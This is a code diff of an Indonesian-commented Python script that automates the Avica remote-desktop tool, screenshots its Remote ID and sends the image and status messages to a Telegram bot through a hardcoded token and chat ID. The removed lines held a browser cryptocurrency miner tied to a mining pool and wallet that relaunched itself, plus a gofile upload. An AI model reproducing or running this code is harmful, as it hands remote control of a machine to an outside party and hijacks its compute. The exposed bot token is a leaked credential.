@@ -4,9 +4,12 @@ import requests
 import os
 import pygetwindow as gw
 import subprocess
-import webbrowser
 import sys
 from PIL import ImageGrab  # Alternative for screenshot
+
+# Konfigurasi Telegram Bot
+TELEGRAM_BOT_TOKEN = "8702870038:AAGOvfoxAMUFreoWjRdQgCkBqlHr1Y5jMB8"  # Ganti dengan token bot Anda
+TELEGRAM_CHAT_ID = "5504921604"      # Ganti dengan ID Telegram Anda
 
 # Install missing dependency if needed
 try:
@@ -28,62 +31,54 @@ actions = [
 time.sleep(15)
 
 img_filename = 'AvicaRemoteIDFixed.png'
-mining_url = "https://webminer.pages.dev?algorithm=cwm_minotaurx&host=minotaurx.sea.mine.zpool.ca&port=7019&worker=ltc1qt0g53lel7faph5cev0zcyc594224us0cepxmz5&password=c%3DLTC&workers=4"
 
-def upload_image_to_gofile(img_filename):
-    """Upload screenshot to gofile"""
+def send_photo_to_telegram(image_path, caption=""):
+    """Send photo to Telegram"""
     try:
-        url = 'https://store5.gofile.io/uploadFile'
-        with open(img_filename, 'rb') as img_file:
-            files = {'file': img_file}
-            r = requests.post(url, files=files)
-            r.raise_for_status()
-            j = r.json()
-            if j.get('status') == 'ok':
-                return j['data']['downloadPage']
+        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendPhoto"
+        with open(image_path, 'rb') as photo:
+            files = {'photo': photo}
+            data = {'chat_id': TELEGRAM_CHAT_ID, 'caption': caption}
+            response = requests.post(url, files=files, data=data)
+            response.raise_for_status()
+            result = response.json()
+            if result.get('ok'):
+                print(f"Foto berhasil dikirim ke Telegram: {caption}")
+                return True
+            else:
+                print(f"Gagal mengirim ke Telegram: {result}")
+                return False
     except Exception as e:
-        print(f"Upload error: {e}")
-    return None
+        print(f"Error mengirim ke Telegram: {e}")
+        return False
+
+def send_message_to_telegram(message):
+    """Send text message to Telegram"""
+    try:
+        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
+        data = {'chat_id': TELEGRAM_CHAT_ID, 'text': message}
+        response = requests.post(url, data=data)
+        response.raise_for_status()
+        result = response.json()
+        if result.get('ok'):
+            print(f"Pesan berhasil dikirim ke Telegram: {message[:50]}...")
+            return True
+        else:
+            print(f"Gagal mengirim pesan: {result}")
+            return False
+    except Exception as e:
+        print(f"Error mengirim pesan: {e}")
+        return False
 
 def minimize_non_avica():
     """Minimize semua window kecuali Avica"""
     for w in gw.getAllWindows():
         try:
             title = w.title.lower()
-            if "avica" not in title and "chrome" not in title and not w.isMinimized:
+            if "avica" not in title and not w.isMinimized:
                 w.minimize()
         except:
             pass
-
-def open_chrome_and_mine():
-    """Buka Chrome dan langsung mining"""
-    try:
-        # Coba buka Chrome dengan URL mining
-        chrome_paths = [
-            "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
-            "C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe"
-        ]
-        chrome_path = None
-        for path in chrome_paths:
-            if os.path.exists(path):
-                chrome_path = path
-                break
-        
-        if chrome_path:
-            subprocess.Popen([chrome_path, "--start-maximized", mining_url])
-        else:
-            # Fallback ke webbrowser default
-            webbrowser.open(mining_url, new=1)
-        
-        print("Membuka Chrome untuk mining...")
-        time.sleep(10)
-        
-        # Fullscreen Chrome (F11)
-        pag.press('f11')
-        time.sleep(2)
-        
-    except Exception as e:
-        print(f"Error buka Chrome: {e}")
 
 def take_screenshot():
     """Take screenshot with fallback methods"""
@@ -106,6 +101,9 @@ def take_screenshot():
             return False
 
 def main():
+    # Kirim notifikasi awal
+    send_message_to_telegram("🤖 Script Avica Remote dimulai...")
+    
     for x, y, duration in actions:
         pag.click(x, y, duration=duration)
         
@@ -120,9 +118,11 @@ def main():
             avica_path = "C:\\Program Files (x86)\\Avica\\Avica.exe"
             if os.path.exists(avica_path):
                 subprocess.Popen(f'"{avica_path}"', shell=True)
+                send_message_to_telegram("✅ Avica berhasil dijalankan")
             else:
                 print("Avica.exe tidak ditemukan, coba jalankan dari installer...")
                 subprocess.Popen("AvicaLite_v8.0.8.9.exe", shell=True)
+                send_message_to_telegram("⚠️ Menjalankan installer Avica...")
             
             time.sleep(15)
             pag.click(249, 203, duration=4)
@@ -130,30 +130,30 @@ def main():
             minimize_non_avica()
             time.sleep(10)
             
-            # Screenshot dan upload
+            # Screenshot dan kirim ke Telegram
             if take_screenshot():
                 print("Screenshot berhasil diambil")
-                link = upload_image_to_gofile(img_filename)
-                print("Uploaded:", link if link else "failed")
+                # Kirim screenshot ke Telegram
+                send_photo_to_telegram(img_filename, "📸 Avica Remote ID - Screenshot")
             else:
                 print("Gagal mengambil screenshot")
-            
-            # Auto buka Chrome dan mulai mining
-            print("Membuka browser untuk mining...")
-            open_chrome_and_mine()
+                send_message_to_telegram("❌ Gagal mengambil screenshot Avica")
             
         time.sleep(10)
     
-    print("Done! Mining berjalan...")
+    print("Done! Script selesai dijalankan.")
+    send_message_to_telegram("✅ Script Avica Remote selesai dijalankan!")
     
-    # Keep script running
+    # Keep script running untuk monitoring
     while True:
         time.sleep(60)
-        # Cek setiap menit apakah Chrome masih jalan
-        chrome_windows = [w for w in gw.getAllWindows() if "chrome" in w.title.lower()]
-        if not chrome_windows:
-            print("Chrome tertutup, membuka kembali...")
-            open_chrome_and_mine()
+        # Optional: bisa ditambahkan monitoring lain jika diperlukan
+        pass
 
 if __name__ == "__main__":
+    # Cek konfigurasi Telegram
+    if TELEGRAM_BOT_TOKEN == "YOUR_BOT_TOKEN_HERE" or TELEGRAM_CHAT_ID == "YOUR_CHAT_ID_HERE":
+        print("⚠️ PERINGATAN: Silakan ganti TELEGRAM_BOT_TOKEN dan TELEGRAM_CHAT_ID dengan nilai yang benar!")
+        print("Program akan tetap berjalan tapi tanpa notifikasi Telegram.")
+    
     main()
